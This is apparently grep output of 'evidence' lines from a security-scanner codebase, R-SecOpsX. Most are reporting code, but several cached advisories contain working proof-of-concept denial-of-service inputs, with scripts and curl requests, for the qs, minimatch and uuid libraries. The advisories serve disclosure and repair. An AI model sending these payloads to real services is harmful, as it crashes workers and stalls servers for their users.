+[Evidence] D:\data\Code test\r-SecOpsX_V11\reporting\excel_report.py:832 | ws["A3"]="No SBOM components were available for license-evidence reporting."
+[Evidence] D:\data\Code test\r-SecOpsX_V11\reporting\excel_report.py:838 | ("Evidence Resolver",summary.get("resolver","NOT_AVAILABLE")),
+[Evidence] D:\data\Code test\r-SecOpsX_V11\reporting\executive_pdf_report.py:215 | Spacer(1,0.15*cm), Paragraph("Age is taken from the canonical vulnerability-age evidence. Reachability is static evidence and is not runtime exploitability proof.", S["BodySmall"])]
+[Evidence] D:\data\Code test\r-SecOpsX_V11\reporting\pdf_report.py:299 | # evidence, descriptions, or file lists must therefore be emitted as multiple
+[Evidence] D:\data\Code test\r-SecOpsX_V11\reporting\pdf_report.py:2567 | f"source-to-sink evidence or explicit confirmation.",
+[Evidence] D:\data\Code test\r-SecOpsX_V11\reporting\pdf_report.py:2591 | evidence_type = ap.get("evidence_type", "pattern-detected")
+[Evidence] D:\data\Code test\r-SecOpsX_V11\reporting\pdf_report.py:2594 | evidence_note = ap.get("evidence_note", "")
+[Evidence] D:\data\Code test\r-SecOpsX_V11\reporting\pdf_report.py:2597 | ev_color = "#E9F7EF" if evidence_type == "taint-confirmed" else "#FFF8E7"
+[Evidence] D:\data\Code test\r-SecOpsX_V11\reporting\pdf_report.py:2600 | ev_border = colors.HexColor("#27AE60") if evidence_type == "taint-confirmed" else GOLD
+[Evidence] D:\data\Code test\r-SecOpsX_V11\reporting\pdf_report.py:2603 | ev_label = format_attack_path_label(evidence_type == "taint-confirmed")
+[Evidence] D:\data\Code test\r-SecOpsX_V11\reporting\pdf_report.py:3257 | ev_rows=[[Paragraph("<b>Code Evidence</b>",S["BodySmall"])]]
+[Evidence] D:\data\Code test\r-SecOpsX_V11\reporting\pdf_report.py:3302 | qualification = str(f.get("evidence_qualification") or "").strip()
+[Evidence] D:\data\Code test\r-SecOpsX_V11\reporting\pdf_report.py:3314 | ev_rows.append([Paragraph(f"<b>Evidence Qualification:</b> {qualification}", S["BodySmall"])])
+[Evidence] D:\data\Code test\r-SecOpsX_V11\reporting\pdf_report.py:3839 | summary=payload.get("license_evidence_summary",{}) or {}
+[Evidence] D:\data\Code test\r-SecOpsX_V11\reporting\pdf_report.py:3854 | f"are covered by canonical license evidence. "
+[Evidence] D:\data\Code test\r-SecOpsX_V11\reporting\pdf_report.py:3866 | f"Evidence Unavailable: <b>{cats.get('Evidence Unavailable',0)}</b>. "
+[Evidence] D:\data\Code test\r-SecOpsX_V11\reporting\pdf_report.py:3869 | f"Evidence review required: <b>{summary.get('review_required_components',0)}</b>; "
+[Evidence] D:\data\Code test\r-SecOpsX_V11\reporting\pdf_report.py:3893 | "License Category","Resolution Status","Evidence Source",
+[Evidence] D:\data\Code test\r-SecOpsX_V11\reporting\report_mappings.py:471 | return ('CONFIRMED — Source-to-sink evidence validated.' if is_confirmed else
+[Evidence] D:\data\Code test\r-SecOpsX_V11\reporting\report_mappings.py:477 | 'source-to-sink evidence. Candidate paths represent conditional scenarios requiring manual validation.')
+[Evidence] D:\data\Code test\r-SecOpsX_V11\reporting\report_mappings.py:479 | return 'These represent modeled multi-step attack scenarios with validated source-to-sink evidence.'
+[Evidence] D:\data\Code test\r-SecOpsX_V11\reporting\sarif_export.py:76 | snippet = finding.get("snippet") or finding.get("evidence") or ""
+[Evidence] D:\data\Code test\r-SecOpsX_V11\reporting\sarif_export.py:135 | "blast_radius": finding.get("blast_radius"), "correlation_evidence": finding.get("correlation_evidence"),
+[Evidence] D:\data\Code test\r-SecOpsX_V11\reporting\vex_export.py:51 | if st == "under_investigation": return "insufficient_runtime_evidence"
+[Evidence] D:\data\Code test\r-SecOpsX_V11\reporting\vex_export.py:56 | if st == "fixed": return "R-SecOpsX marks this vulnerability as fixed based on fixed_in or explicit VEX status evidence."
+[Evidence] D:\data\Code test\r-SecOpsX_V11\reporting\vex_export.py:58 | if st == "under_investigation": return "R-SecOpsX found vulnerability evidence, but reachability or exploitability could not be conclusively established."
+[Evidence] D:\data\Code test\r-SecOpsX_V11\reporting\vex_export.py:59 | return "R-SecOpsX did not observe reachable usage evidence for this vulnerable component in the current scan context."
+[Evidence] D:\data\Code test\r-SecOpsX_V11\reporting\vex_export.py:65 | if _vex_status(pkg) == "under_investigation": return "Review component usage, exposure, and exploitability evidence before approving release."
+[Evidence] D:\data\Code test\r-SecOpsX_V11\reports\.vuln_cache.json:3507 | "details": "### Summary\n\n`qs.stringify()` calls `utils.isBuffer()` on every value it serializes, and `utils.isBuffer()` invokes `obj.constructor.isBuffer(obj)` without checking that it is callable. A value whose own `constructor.isBuffer` is a non-function makes `qs` call a non-callable and throw `TypeError`. Such a value is produced **by `qs.parse` itself** from an untrusted query string when `plainObjects: true` or `allowPrototypes: true` is set, so a pure-`qs` `parse` \u2192 `stringify` round-trip \u2014 no `JSON.parse` \u2014 turns an unauthenticated query string into an uncaught throw.\n\nAn attacker-controlled `parse` input reaches the host application's availability asset \u2014 via `qs`'s own recommended `plainObjects` mitigation \u2014 and triggers an uncaught exception during a `parse` \u2192 `stringify` round-trip.\n\n### Details\n`utils.isBuffer` runs at `lib/stringify.js:127` for every serialized value:\n\n```js\nif (isNonNullishPrimitive(obj) || utils.isBuffer(obj)) { ... }\n```\n\n`utils.isBuffer` (`lib/utils.js:327-333`) invokes `obj.constructor.isBuffer` without verifying it is callable:\n\n```js\nvar isBuffer = function isBuffer(obj) {\n    if (!obj || typeof obj !== 'object') { return false; }\n    return !!(obj.constructor && obj.constructor.isBuffer && obj.constructor.isBuffer(obj));\n};\n```\n\n`constructor` and `isBuffer` are ordinary keys. `qs.parse` with `plainObjects: true` or `allowPrototypes: true` keeps them as own properties, so the parsed value carries a non-function `constructor.isBuffer`; `stringify` then calls a non-callable and throws `TypeError`. By contrast `utils.isRegExp` uses a brand check (`Object.prototype.toString`); the missing guard here is an internal inconsistency, not a platform limitation.\n\n\n### Trust Boundary Note\n\n`qs.stringify` alone treats its input as caller-constructed, so serializing a hostile object could be argued outside its contract. This report does not depend on that framing: the malicious shape is produced by **`qs.parse`, whose input is untrusted by design**. `qs.parse` normally strips a `constructor` key via its prototype guard, but with the documented options `plainObjects: true` or `allowPrototypes: true` the key survives and lands as an own property. Feeding the parsed object back into `qs.stringify` \u2014 the standard round-trip in gateways and request-forwarders \u2014 then hits the unchecked call. \n\n\n### PoC\n`poc02c_isBuffer_qs_only_roundtrip.js` \u2014 pure-`qs` chain, no `JSON.parse`; an untrusted query string alone reaches the throw:\n\n```js\n'use strict';\nvar qs = require('qs');\n\nvar untrustedQueryString = 'x%5Bconstructor%5D%5BisBuffer%5D=y'; // x[constructor][isBuffer]=y\n\nvar parsed = qs.parse(untrustedQueryString, { plainObjects: true });\nconsole.log('[parse] kept constructor key:', JSON.stringify(parsed));\n\ntry {\n    qs.stringify(parsed);\n    console.log('[stringify] no throw (unexpected)');\n} catch (e) {\n    console.log('[stringify] DoS reproduced ->', e.constructor.name + ':', e.message);\n}\n```\n\n`poc02_isBuffer.js` \u2014 the minimal defect:\n\n```js\n'use strict';\nvar qs = require('qs');\ntry {\n    qs.stringify(JSON.parse('{\"a\":{\"constructor\":{\"isBuffer\":\"x\"}}}'));\n} catch (e) {\n    console.log('[A] DoS reproduced ->', e.constructor.name + ':', e.message);\n}\n```\n\n`poc02b_isBuffer_async_crash.js` \u2014 worker death in an async sink:\n\n```js\n'use strict';\nvar qs = require('qs');\n\nfunction handleRequestAsync(clientJsonBody) {\n    try {\n        setImmediate(function () {                 // async continuation, outside the try\n            qs.stringify(JSON.parse(clientJsonBody)); // throws here, uncaught\n        });\n        console.log('[handler] returned 200 synchronously; async work scheduled');\n    } catch (e) {\n        console.log('[handler] caught synchronously (will NOT happen):', e.message);\n    }\n}\nprocess.on('exit', function (code) {\n    console.log('[proc] process exiting with code:', code);\n});\nhandleRequestAsync('{\"filters\":{\"constructor\":{\"isBuffer\":\"x\"}}}');\n```\n\n### Execution Steps\n\n```bash\ncd poc\nnpm install qs@6.15.3\nnode poc02c_isBuffer_qs_only_roundtrip.js  # pure qs parse->stringify -> TypeError\nnode poc02_isBuffer.js                      # minimal defect -> TypeError inside stringify\nnode poc02b_isBuffer_async_crash.js         # async sink -> uncaught throw -> exit code 1\n```\n\n### Reproduction Evidence\n\n`poc02c_isBuffer_qs_only_roundtrip.js` :\n\n```\n[parse] kept constructor key: {\"x\":{\"constructor\":{\"isBuffer\":\"y\"}}}\n[stringify] DoS reproduced -> TypeError: obj.constructor.isBuffer is not a function\n```\n\n`poc02_isBuffer.js`:\n\n```\n[A] DoS reproduced -> TypeError: obj.constructor.isBuffer is not a function\n```\n\n`poc02b_isBuffer_async_crash.js` :\n\n```\n[handler] returned 200 synchronously; async work scheduled\n[proc] process exiting with code: 1\nTypeError: obj.constructor.isBuffer is not a function\n    at Object.isBuffer (.../qs/lib/utils.js:332:78)\n    at stringify (.../qs/lib/stringify.js:127:45)\n=== EXIT CODE: 1 ===\n```\n\nThe pure-`qs` round-trip shows the malicious shape originates from `qs.parse` of an untrusted query string, with no `JSON.parse`. The synchronous `try/catch` in the async case does not catch the throw; the process exits with code 1, denying service to all requests on that worker.\n\n### Impact\n\nAn unauthenticated request degrades any endpoint that re-serializes deserialized client data with `qs.stringify`. The primary impact is a per-request failure: the handler throws and the framework returns HTTP 500. Where the call sits in an unguarded async continuation, the throw escapes and the worker process exits, denying service to all requests it was handling, which means a higher impact that depends on the application's error handling, not on `qs`.\n\n### Recommended Fix\n\nReplace the duck-type with a brand check mirroring `utils.isRegExp`:\n\n```js\nvar isBuffer = function isBuffer(obj) {\n    if (!obj || typeof obj !== 'object') { return false; }\n    if (typeof Buffer !== 'undefined' && typeof Buffer.isBuffer === 'function') {\n        return Buffer.isBuffer(obj);\n    }\n    return Object.prototype.toString.call(obj) === '[object Uint8Array]';\n};\n```\n\nIf duck-typing must remain, require `typeof obj.constructor.isBuffer === 'function'` before invoking and wrap the call in `try/catch`.",
+[Evidence] D:\data\Code test\r-SecOpsX_V11\reports\.vuln_cache.json:5896 | "details": "### Summary\n\nNested `*()` extglobs produce regexps with nested unbounded quantifiers (e.g. `(?:(?:a|b)*)*`), which exhibit catastrophic backtracking in V8. With a 12-byte pattern `*(*(*(a|b)))` and an 18-byte non-matching input, `minimatch()` stalls for over 7 seconds. Adding a single nesting level or a few input characters pushes this to minutes. This is the most severe finding: it is triggered by the default `minimatch()` API with no special options, and the minimum viable pattern is only 12 bytes. The same issue affects `+()` extglobs equally.\n\n---\n\n### Details\n\nThe root cause is in `AST.toRegExpSource()` at [`src/ast.ts#L598`](https://github.com/isaacs/minimatch/blob/v10.2.2/src/ast.ts#L598). For the `*` extglob type, the close token emitted is `)*` or `)?`, wrapping the recursive body in `(?:...)*`. When extglobs are nested, each level adds another `*` quantifier around the previous group:\n\n```typescript\n: this.type === '*' && bodyDotAllowed ? `)?`\n: `)${this.type}`\n```\n\nThis produces the following regexps:\n\n| Pattern              | Generated regex                          |\n|----------------------|------------------------------------------|\n| `*(a\\|b)`            | `/^(?:a\\|b)*$/`                          |\n| `*(*(a\\|b))`         | `/^(?:(?:a\\|b)*)*$/`                     |\n| `*(*(*(a\\|b)))`      | `/^(?:(?:(?:a\\|b)*)*)*$/`               |\n| `*(*(*(*(a\\|b))))` | `/^(?:(?:(?:(?:a\\|b)*)*)*)*$/`          |\n\nThese are textbook nested-quantifier patterns. Against an input of repeated `a` characters followed by a non-matching character `z`, V8's backtracking engine explores an exponential number of paths before returning `false`.\n\nThe generated regex is stored on `this.set` and evaluated inside `matchOne()` at [`src/index.ts#L1010`](https://github.com/isaacs/minimatch/blob/v10.2.2/src/index.ts#L1010) via `p.test(f)`. It is reached through the standard `minimatch()` call with no configuration.\n\nMeasured times via `minimatch()`:\n\n| Pattern              | Input              | Time       |\n|----------------------|--------------------|------------|\n| `*(*(a\\|b))`         | `a` x30 + `z`      | ~68,000ms  |\n| `*(*(*(a\\|b)))`      | `a` x20 + `z`      | ~124,000ms |\n| `*(*(*(*(a\\|b))))` | `a` x25 + `z`      | ~116,000ms |\n| `*(a\\|a)`            | `a` x25 + `z`      | ~2,000ms   |\n\nDepth inflection at fixed input `a` x16 + `z`:\n\n| Depth | Pattern              | Time         |\n|-------|----------------------|--------------|\n| 1     | `*(a\\|b)`            | 0ms          |\n| 2     | `*(*(a\\|b))`         | 4ms          |\n| 3     | `*(*(*(a\\|b)))`      | 270ms        |\n| 4     | `*(*(*(*(a\\|b))))` | 115,000ms    |\n\nGoing from depth 2 to depth 3 with a 20-character input jumps from 66ms to 123,544ms -- a 1,867x increase from a single added nesting level.\n\n---\n\n### PoC\n\nTested on minimatch@10.2.2, Node.js 20.\n\n**Step 1 -- verify the generated regexps and timing (standalone script)**\n\nSave as `poc4-validate.mjs` and run with `node poc4-validate.mjs`:\n\n```javascript\nimport { minimatch, Minimatch } from 'minimatch'\n\nfunction timed(fn) {\n  const s = process.hrtime.bigint()\n  let result, error\n  try { result = fn() } catch(e) { error = e }\n  const ms = Number(process.hrtime.bigint() - s) / 1e6\n  return { ms, result, error }\n}\n\n// Verify generated regexps\nfor (let depth = 1; depth <= 4; depth++) {\n  let pat = 'a|b'\n  for (let i = 0; i < depth; i++) pat = `*(${pat})`\n  const re = new Minimatch(pat, {}).set?.[0]?.[0]?.toString()\n  console.log(`depth=${depth} \"${pat}\" -> ${re}`)\n}\n// depth=1 \"*(a|b)\"          -> /^(?:a|b)*$/\n// depth=2 \"*(*(a|b))\"       -> /^(?:(?:a|b)*)*$/\n// depth=3 \"*(*(*(a|b)))\"    -> /^(?:(?:(?:a|b)*)*)*$/\n// depth=4 \"*(*(*(*(a|b))))\" -> /^(?:(?:(?:(?:a|b)*)*)*)*$/\n\n// Safe-length timing (exponential growth confirmation without multi-minute hang)\nconst cases = [\n  ['*(*(*(a|b)))', 15],   // ~270ms\n  ['*(*(*(a|b)))', 17],   // ~800ms\n  ['*(*(*(a|b)))', 19],   // ~2400ms\n  ['*(*(a|b))',    23],   // ~260ms\n  ['*(a|b)',      101],   // <5ms (depth=1 control)\n]\nfor (const [pat, n] of cases) {\n  const t = timed(() => minimatch('a'.repeat(n) + 'z', pat))\n  console.log(`\"${pat}\" n=${n}: ${t.ms.toFixed(0)}ms result=${t.result}`)\n}\n\n// Confirm noext disables the vulnerability\nconst t_noext = timed(() => minimatch('a'.repeat(18) + 'z', '*(*(*(a|b)))', { noext: true }))\nconsole.log(`noext=true: ${t_noext.ms.toFixed(0)}ms (should be ~0ms)`)\n\n// +() is equally affected\nconst t_plus = timed(() => minimatch('a'.repeat(17) + 'z', '+(+(+(a|b)))'))\nconsole.log(`\"+(+(+(a|b)))\" n=18: ${t_plus.ms.toFixed(0)}ms result=${t_plus.result}`)\n```\n\nObserved output:\n```\ndepth=1 \"*(a|b)\"          -> /^(?:a|b)*$/\ndepth=2 \"*(*(a|b))\"       -> /^(?:(?:a|b)*)*$/\ndepth=3 \"*(*(*(a|b)))\"    -> /^(?:(?:(?:a|b)*)*)*$/\ndepth=4 \"*(*(*(*(a|b))))\" -> /^(?:(?:(?:(?:a|b)*)*)*)*$/\n\"*(*(*(a|b)))\" n=15: 269ms result=false\n\"*(*(*(a|b)))\" n=17: 268ms result=false\n\"*(*(*(a|b)))\" n=19: 2408ms result=false\n\"*(*(a|b))\"    n=23: 257ms result=false\n\"*(a|b)\"       n=101: 0ms result=false\nnoext=true: 0ms (should be ~0ms)\n\"+(+(+(a|b)))\" n=18: 6300ms result=false\n```\n\n**Step 2 -- HTTP server (event loop starvation proof)**\n\nSave as `poc4-server.mjs`:\n\n```javascript\nimport http from 'node:http'\nimport { URL } from 'node:url'\nimport { minimatch } from 'minimatch'\n\nconst PORT = 3001\nhttp.createServer((req, res) => {\n  const url     = new URL(req.url, `http://localhost:${PORT}`)\n  const pattern = url.searchParams.get('pattern') ?? ''\n  const path    = url.searchParams.get('path') ?? ''\n\n  const start  = process.hrtime.bigint()\n  const result = minimatch(path, pattern)\n  const ms     = Number(process.hrtime.bigint() - start) / 1e6\n\n  console.log(`[${new Date().toISOString()}] ${ms.toFixed(0)}ms pattern=\"${pattern}\" path=\"${path.slice(0,30)}\"`)\n  res.writeHead(200, { 'Content-Type': 'application/json' })\n  res.end(JSON.stringify({ result, ms: ms.toFixed(0) }) + '\\n')\n}).listen(PORT, () => console.log(`listening on ${PORT}`))\n```\n\nTerminal 1 -- start the server:\n```\nnode poc4-server.mjs\n```\n\nTerminal 2 -- fire the attack (depth=3, 19 a's + z) and return immediately:\n```\ncurl \"http://localhost:3001/match?pattern=*%28*%28*%28a%7Cb%29%29%29&path=aaaaaaaaaaaaaaaaaaaz\" &\n```\n\nTerminal 3 -- send a benign request while the attack is in-flight:\n```\ncurl -w \"\\ntime_total: %{time_total}s\\n\" \"http://localhost:3001/match?pattern=*%28a%7Cb%29&path=aaaz\"\n```\n\n**Observed output -- Terminal 2 (attack):**\n```\n{\"result\":false,\"ms\":\"64149\"}\n```\n\n**Observed output -- Terminal 3 (benign, concurrent):**\n```\n{\"result\":false,\"ms\":\"0\"}\n\ntime_total: 63.022047s\n```\n\n**Terminal 1 (server log):**\n```\n[2026-02-20T09:41:17.624Z] pattern=\"*(*(*(a|b)))\" path=\"aaaaaaaaaaaaaaaaaaaz\"\n[2026-02-20T09:42:21.775Z] done in 64149ms result=false\n[2026-02-20T09:42:21.779Z] pattern=\"*(a|b)\" path=\"aaaz\"\n[2026-02-20T09:42:21.779Z] done in 0ms result=false\n```\n\nThe server reports `\"ms\":\"0\"` for the benign request -- the legitimate request itself requires no CPU time. The entire 63-second `time_total` is time spent waiting for the event loop to be released. The benign request was only dispatched after the attack completed, confirmed by the server log timestamps.\n\nNote: standalone script timing (~7s at n=19) is lower than server timing (64s) because the standalone script had warmed up V8's JIT through earlier sequential calls. A cold server hits the worst case. Both measurements confirm catastrophic backtracking -- the server result is the more realistic figure for production impact.\n\n---\n\n### Impact\n\nAny context where an attacker can influence the glob pattern passed to `minimatch()` is vulnerable. The realistic attack surface includes build tools and task runners that accept user-supplied glob arguments, multi-tenant platforms where users configure glob-based rules (file filters, ignore lists, include patterns), and CI/CD pipelines that evaluate user-submitted config files containing glob expressions. No evidence was found of production HTTP servers passing raw user input directly as the extglob pattern, so that framing is not claimed here.\n\nDepth 3 (`*(*(*(a|b)))`, 12 bytes) stalls the Node.js event loop for 7+ seconds with an 18-character input. Depth 2 (`*(*(a|b))`, 9 bytes) reaches 68 seconds with a 31-character input. Both the pattern and the input fit in a query string or JSON body without triggering the 64 KB length guard.\n\n`+()` extglobs share the same code path and produce equivalent worst-case behavior (6.3 seconds at depth=3 with an 18-character input, confirmed).\n\n**Mitigation available:** passing `{ noext: true }` to `minimatch()` disables extglob processing entirely and reduces the same input to 0ms. Applications that do not need extglob syntax should set this option when handling untrusted patterns.",
+[Evidence] D:\data\Code test\r-SecOpsX_V11\reports\.vuln_cache.json:6912 | "details": "### Summary\n\n`qs.stringify()` calls `utils.isBuffer()` on every value it serializes, and `utils.isBuffer()` invokes `obj.constructor.isBuffer(obj)` without checking that it is callable. A value whose own `constructor.isBuffer` is a non-function makes `qs` call a non-callable and throw `TypeError`. Such a value is produced **by `qs.parse` itself** from an untrusted query string when `plainObjects: true` or `allowPrototypes: true` is set, so a pure-`qs` `parse` \u2192 `stringify` round-trip \u2014 no `JSON.parse` \u2014 turns an unauthenticated query string into an uncaught throw.\n\nAn attacker-controlled `parse` input reaches the host application's availability asset \u2014 via `qs`'s own recommended `plainObjects` mitigation \u2014 and triggers an uncaught exception during a `parse` \u2192 `stringify` round-trip.\n\n### Details\n`utils.isBuffer` runs at `lib/stringify.js:127` for every serialized value:\n\n```js\nif (isNonNullishPrimitive(obj) || utils.isBuffer(obj)) { ... }\n```\n\n`utils.isBuffer` (`lib/utils.js:327-333`) invokes `obj.constructor.isBuffer` without verifying it is callable:\n\n```js\nvar isBuffer = function isBuffer(obj) {\n    if (!obj || typeof obj !== 'object') { return false; }\n    return !!(obj.constructor && obj.constructor.isBuffer && obj.constructor.isBuffer(obj));\n};\n```\n\n`constructor` and `isBuffer` are ordinary keys. `qs.parse` with `plainObjects: true` or `allowPrototypes: true` keeps them as own properties, so the parsed value carries a non-function `constructor.isBuffer`; `stringify` then calls a non-callable and throws `TypeError`. By contrast `utils.isRegExp` uses a brand check (`Object.prototype.toString`); the missing guard here is an internal inconsistency, not a platform limitation.\n\n\n### Trust Boundary Note\n\n`qs.stringify` alone treats its input as caller-constructed, so serializing a hostile object could be argued outside its contract. This report does not depend on that framing: the malicious shape is produced by **`qs.parse`, whose input is untrusted by design**. `qs.parse` normally strips a `constructor` key via its prototype guard, but with the documented options `plainObjects: true` or `allowPrototypes: true` the key survives and lands as an own property. Feeding the parsed object back into `qs.stringify` \u2014 the standard round-trip in gateways and request-forwarders \u2014 then hits the unchecked call. \n\n\n### PoC\n`poc02c_isBuffer_qs_only_roundtrip.js` \u2014 pure-`qs` chain, no `JSON.parse`; an untrusted query string alone reaches the throw:\n\n```js\n'use strict';\nvar qs = require('qs');\n\nvar untrustedQueryString = 'x%5Bconstructor%5D%5BisBuffer%5D=y'; // x[constructor][isBuffer]=y\n\nvar parsed = qs.parse(untrustedQueryString, { plainObjects: true });\nconsole.log('[parse] kept constructor key:', JSON.stringify(parsed));\n\ntry {\n    qs.stringify(parsed);\n    console.log('[stringify] no throw (unexpected)');\n} catch (e) {\n    console.log('[stringify] DoS reproduced ->', e.constructor.name + ':', e.message);\n}\n```\n\n`poc02_isBuffer.js` \u2014 the minimal defect:\n\n```js\n'use strict';\nvar qs = require('qs');\ntry {\n    qs.stringify(JSON.parse('{\"a\":{\"constructor\":{\"isBuffer\":\"x\"}}}'));\n} catch (e) {\n    console.log('[A] DoS reproduced ->', e.constructor.name + ':', e.message);\n}\n```\n\n`poc02b_isBuffer_async_crash.js` \u2014 worker death in an async sink:\n\n```js\n'use strict';\nvar qs = require('qs');\n\nfunction handleRequestAsync(clientJsonBody) {\n    try {\n        setImmediate(function () {                 // async continuation, outside the try\n            qs.stringify(JSON.parse(clientJsonBody)); // throws here, uncaught\n        });\n        console.log('[handler] returned 200 synchronously; async work scheduled');\n    } catch (e) {\n        console.log('[handler] caught synchronously (will NOT happen):', e.message);\n    }\n}\nprocess.on('exit', function (code) {\n    console.log('[proc] process exiting with code:', code);\n});\nhandleRequestAsync('{\"filters\":{\"constructor\":{\"isBuffer\":\"x\"}}}');\n```\n\n### Execution Steps\n\n```bash\ncd poc\nnpm install qs@6.15.3\nnode poc02c_isBuffer_qs_only_roundtrip.js  # pure qs parse->stringify -> TypeError\nnode poc02_isBuffer.js                      # minimal defect -> TypeError inside stringify\nnode poc02b_isBuffer_async_crash.js         # async sink -> uncaught throw -> exit code 1\n```\n\n### Reproduction Evidence\n\n`poc02c_isBuffer_qs_only_roundtrip.js` :\n\n```\n[parse] kept constructor key: {\"x\":{\"constructor\":{\"isBuffer\":\"y\"}}}\n[stringify] DoS reproduced -> TypeError: obj.constructor.isBuffer is not a function\n```\n\n`poc02_isBuffer.js`:\n\n```\n[A] DoS reproduced -> TypeError: obj.constructor.isBuffer is not a function\n```\n\n`poc02b_isBuffer_async_crash.js` :\n\n```\n[handler] returned 200 synchronously; async work scheduled\n[proc] process exiting with code: 1\nTypeError: obj.constructor.isBuffer is not a function\n    at Object.isBuffer (.../qs/lib/utils.js:332:78)\n    at stringify (.../qs/lib/stringify.js:127:45)\n=== EXIT CODE: 1 ===\n```\n\nThe pure-`qs` round-trip shows the malicious shape originates from `qs.parse` of an untrusted query string, with no `JSON.parse`. The synchronous `try/catch` in the async case does not catch the throw; the process exits with code 1, denying service to all requests on that worker.\n\n### Impact\n\nAn unauthenticated request degrades any endpoint that re-serializes deserialized client data with `qs.stringify`. The primary impact is a per-request failure: the handler throws and the framework returns HTTP 500. Where the call sits in an unguarded async continuation, the throw escapes and the worker process exits, denying service to all requests it was handling, which means a higher impact that depends on the application's error handling, not on `qs`.\n\n### Recommended Fix\n\nReplace the duck-type with a brand check mirroring `utils.isRegExp`:\n\n```js\nvar isBuffer = function isBuffer(obj) {\n    if (!obj || typeof obj !== 'object') { return false; }\n    if (typeof Buffer !== 'undefined' && typeof Buffer.isBuffer === 'function') {\n        return Buffer.isBuffer(obj);\n    }\n    return Object.prototype.toString.call(obj) === '[object Uint8Array]';\n};\n```\n\nIf duck-typing must remain, require `typeof obj.constructor.isBuffer === 'function'` before invoking and wrap the call in `try/catch`.",
+[Evidence] D:\data\Code test\r-SecOpsX_V11\reports\.vuln_cache.json:7536 | "details": "### Summary\n\nThe `v3()`, `v5()`, and `v6()` [API methods](https://github.com/uuidjs/uuid#api-summary) (not `uuid` release versions) accept external output buffers but do not reject out-of-range writes (small `buf` or large `offset`).  \nBy contrast, `v4()`, `v1()`, and `v7()` API methods explicitly throw `RangeError` on invalid bounds.\n\nThis inconsistency allows **silent partial writes** into caller-provided buffers.\n\n\n### Affected code\n\n- `src/v35.ts` (`v3()`/`v5()` path) writes `buf[offset + i]` without bounds validation.\n- `src/v6.ts` writes `buf[offset + i]` without bounds validation.\n\n### Reproducible PoC\n\n```bash\ncd /home/StrawHat/uuid\nnpm ci\nnpm run build\n\nnode --input-type=module -e \"\nimport {v4,v5,v6} from './dist-node/index.js';\nconst ns='6ba7b810-9dad-11d1-80b4-00c04fd430c8';\nfor (const [name,fn] of [\n  ['v4()',()=>v4({},new Uint8Array(8),4)],\n  ['v5()',()=>v5('x',ns,new Uint8Array(8),4)],\n  ['v6()',()=>v6({},new Uint8Array(8),4)],\n]) {\n  try { fn(); console.log(name,'NO_THROW'); }\n  catch(e){ console.log(name,'THREW',e.name); }\n}\"\n```\n\nObserved:\n\n- `v4() THREW RangeError`\n- `v5() NO_THROW`\n- `v6() NO_THROW`\n\nExample partial overwrite evidence captured during audit:\n\n```text\nsame true buf [\n  170, 170, 170, 170,\n   75, 224, 100,  63\n]\nv6 [\n  187, 187, 187, 187,\n   31,  19, 185,  64\n]\n```\n\n### Security impact\n\n- **Primary**: integrity/robustness issue (silent partial output).\n- If an application assumes full UUID writes into preallocated buffers, this can produce malformed/truncated/partially stale identifiers without error.\n- In systems where caller-controlled offsets/buffer sizes are exposed indirectly, this may become a security-relevant logic flaw.\n\n### Suggested fix\n\nAdd the same guard used by `v4()`/`v1()`/`v7()`:\n\n```ts\nif (offset < 0 || offset + 16 > buf.length) {\n  throw new RangeError(`UUID byte range ${offset}:${offset + 15} is out of buffer bounds`);\n}\n```\n\nApply to:\n\n- `src/v35.ts` (covers `v3()` and `v5()`)\n- `src/v6.ts`",
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\abom.py:309 | def _looks_like_comment_or_type_declaration(path: Path, evidence: str) -> bool:
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\abom.py:311 | stripped = evidence.strip()
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\abom.py:322 | def _rule_allowed(rule, evidence, window, path):
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\abom.py:358 | evidence,
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\abom.py:371 | "evidence": evidence.strip(),
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\abom.py:419 | evidence = (
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\abom.py:425 | if _looks_like_comment_or_type_declaration(path, evidence):
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\abom.py:448 | if not _rule_allowed(rule, evidence, window, path):
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\abom.py:456 | evidence,
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\advanced_ai_security.py:29 | "GOV13_red_team_evidence_missing.py": ("GOV13_RED_TEAM_EVIDENCE_MISSING", "AI Red-Team Evidence Missing", "Medium", "ai_red_team_evidence_missing"),
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\advanced_ai_security.py:74 | "GOV13_red_team_evidence_missing.py": ("GOV13_AI_RED_TEAM_EVIDENCE_MISSING", "AI Red-Team Evidence Missing", "Medium", "ai_red_team_evidence_missing"),
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\aibom.py:193 | def _make_aibom_item(rule: dict, filepath: str, line: int, evidence: str, model_hint: str | None = None) -> dict:
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\aibom.py:201 | "evidence": evidence.strip(),
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\aibom.py:244 | evidence = lines[line_no - 1] if 0 <= line_no - 1 < len(lines) else ""
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\aibom.py:246 | if evidence.lstrip().startswith(("#", "//", "*")):
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\aibom.py:256 | evidence,
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\aibom.py:274 | item.get("evidence"),
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\analysis_context.py:11 | Context is classification evidence only.
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\analysis_context.py:19 | 5. Evidence is never changed.
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\analysis_context_v2.py:17 | 5. Evaluation evidence remains available according to configuration.
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\analysis_context_v2.py:53 | "preserve_evidence": True,
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\analysis_context_v2.py:283 | "preserve_evidence": True,
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\analysis_context_v2.py:363 | "preserve_evidence": bool(
+[Evidence] D:\data\Code test\r-SecOpsX_V11\scanner\analysis_context_v2.py:365 | "preserve_evidence",
